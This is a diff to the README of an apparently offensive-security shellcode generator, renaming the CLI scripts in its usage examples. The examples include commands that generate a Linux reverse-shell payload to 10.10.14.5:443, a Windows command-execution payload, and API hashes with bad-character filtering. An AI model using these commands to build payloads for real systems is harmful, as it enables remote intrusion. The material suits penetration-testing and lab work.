@@ -10,20 +10,20 @@ A powerful Python-based shellcode generator supporting Windows (x86/x64) and Lin
 
 ```bash
 # List available payloads
-./shellgen.sh --list-payloads
-./hashgen.sh LoadLibraryA
+./shellgen_cli.py --list-payloads
+./hash_generator.py LoadLibraryA
 
 # Generate Windows MessageBox
-./shellgen.sh --platform windows --payload messagebox --title "Pwned" --message "Hello!"
+./shellgen_cli.py --platform windows --payload messagebox --title "Pwned" --message "Hello!"
 
 # Generate Linux ARM64 reverse shell
-./shellgen.sh --platform linux --payload reverse_shell --host 10.10.14.5 --port 443 --arch arm64
+./shellgen_cli.py --platform linux --payload reverse_shell --host 10.10.14.5 --port 443 --arch arm64
 
 # Generate Windows x86 command execution
-./shellgen.sh --platform windows --payload winexec --cmd "calc.exe" --arch x86
+./shellgen_cli.py --platform windows --payload winexec --cmd "calc.exe" --arch x86
 
 # Generate API hashes
-./hashgen.sh --format python LoadLibraryA GetProcAddress
+./hash_generator.py --format python LoadLibraryA GetProcAddress
 ```
 
 **Alternative** - Direct script usage (requires venv activation):
@@ -355,7 +355,7 @@ shellgen --platform windows --payload winexec \
   --cmd "calc.exe" \
   --arch x86 \
   --bad-chars 00,0a,0d,20 \
-  --debug-shellgen
+  --debug-shellcode
 
 # Output shows:
 # - Line number and offset for each instruction
@@ -481,10 +481,10 @@ cat > my_payload.json << 'EOF'
 EOF
 
 # Generate shellgen from JSON (uses bad_chars from JSON)
-./shellgen.sh --platform windows --json my_payload.json --arch x86
+./shellgen_cli.py --platform windows --json my_payload.json --arch x86
 
 # Override bad_chars from command line (adds 0x20 to bad characters)
-./shellgen.sh --platform windows --json my_payload.json --arch x86 --bad-chars 00,0a,0d,20
+./shellgen_cli.py --platform windows --json my_payload.json --arch x86 --bad-chars 00,0a,0d,20
 ```
 
 **Note:** When using `--json`, the `--bad-chars` CLI argument will override the `bad_chars` specified in the JSON file. The tool will display which source is being used for bad characters.
@@ -498,7 +498,7 @@ The project includes a sample custom payload:
 cat example_payload.json
 
 # Generate shellgen from example
-./shellgen.sh --platform windows --json example_payload.json --arch x86 --format python
+./shellgen_cli.py --platform windows --json example_payload.json --arch x86 --format python
 ```
 
 #### Advanced Example: File Write + Execute
